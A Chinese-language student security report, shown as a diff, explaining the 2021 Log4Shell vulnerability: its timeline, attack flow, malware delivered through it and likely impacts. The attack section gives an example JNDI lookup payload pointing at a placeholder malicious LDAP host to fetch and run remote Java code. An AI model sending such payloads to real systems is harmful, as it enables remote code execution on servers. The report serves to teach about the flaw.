@@ -1,0 +1,58 @@
+網路與系統安全 期末報告				資財三乙 108AB0728 胡茜雯
+
+
+<時間軸>
+(2013.07.17.) the code that caused the vulnerability updated to the repository 
+(2021.11.26.) Register for Miter CVE 
+(2021.11.29.) Creating Jira tickets related to the vulnerability 
+(2021.11.30.) Start patching work in the Github repository 
+(2021.12.01.) First exploit seen by Cloudflare
+(2021.12.05.) Patch commit 
+(2021.12.06.) Patch announcement
+(2021.12.09.) PoC disclosure
+(2021.12.10.) Minecraft target attack detected 
+(2021.12.10.) Various services such as Apple, Amazon, Cloudflare, Minecraft, Steam, Tesla, Twitter, and Baidu are said to be affected by the vulnerability. 
+(2021.12.11.) Alibaba Cloud Security reported the vulnerability in November. 
+
+
+<什麼是log4j>
+log4j是一個Java系統的開放程式碼，大量廣泛使用於各類應用程式，包含web伺服器及雲端服務。
+log4j除了提供紀錄檔功能之外，還提供查詢，可藉由一個表示式 ${some_expreession} 來查詢某些字串並執行。
+
+
+<為什麼log4j漏洞影響那麼大>
+第一、log4j使用非常廣泛，非常多平台都會使用log4j這個函式庫，像是Minecraft 和 Elasticsearch。
+第二、駭客可能有很多個可用的攻擊途徑，且簡單容易。據說在Minecraft上，只需將某個字串貼入聊天區域，就會被駭。
+
+
+<攻擊流程>
+攻擊者發送HTTP請求到目標網站伺服器且加上查詢指令，當log4j紀錄log時，會同時觸發lookup功能，並連線到駭客掌控的LDAP伺服器，LDAP回覆網站伺服器至指定的URL下載並執行惡意的Java程式。
+簡單來說，攻擊者只要發一個惡意的HTTP requested ，就可以在使用者的web伺服器執行惡意程式。
+- 舉例：
+駭客在記錄檔內加入以下表達式：
+${jndi:ldap://{malicious website}/a}
+就可以執行位於  http://{malicious website}/{malicious.class} 的惡意 Java 程式碼。
+
+ 
+<攻擊活動>
+攻擊手法被歸類為「遠端程式碼執行(RCE)」，
+使用者可能被下載的惡意程式：
+-	Mirai殭屍網路
+-	Kinsing挖礦軟體
+-	Khonsari勒索病毒
+
+
+<可能的影響>
+-	佔用電腦原來進行虛擬加密貨幣挖礦
+-	竄改內部資料
+-	變成殭屍網路的一員，用來從事惡意活動。例如：DDos攻擊、發送垃圾郵件
+-	被加密檔案進行勒索
+-	被下載專門竊取登入憑證的惡意程式
+-	被下載cobalt strike beacon 進行內網擴散貨橫向移動
+
+
+<參考資料>
+https://blog.trendmicro.com.tw/?p=70798&_ga=2.9315505.542293628.1642394815-469914717.1642394815
+https://medium.com/s2wblog/logs-of-log4shell-cve-2021-44228-log4j-is-ubiquitous-en-809064312039
+https://dev-to.translate.goog/shubhamsah/apache-log4j-return-of-the-jndi-292o?_x_tr_sl=en&_x_tr_tl=zh-TW&_x_tr_hl=zh-TW&_x_tr_pto=op,sc
+
